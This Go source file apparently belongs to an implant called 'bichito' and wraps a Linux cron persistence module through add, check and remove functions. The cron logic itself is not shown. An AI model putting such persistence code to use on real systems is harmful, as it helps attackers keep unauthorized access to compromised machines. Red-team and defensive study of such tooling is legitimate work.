// +build linuxCron


package persistence

import (
	"bichito/modules/persistence/linux_cron"

)

func AddPersistence(jsonPersistence string,blob string) (bool,string){

	err,result := linux_cron.AddPersistenceLinuxCron(jsonPersistence,blob)
	if err != false {
		return true,result
	}

	return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	err,result := linux_cron.CheckPersistenceLinuxCron(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,result
}


func RemovePersistence(jsonPersistence string) (bool,string){

	err,result := linux_cron.RemovePersistenceLinuxCron(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,"Persistence Removed"
}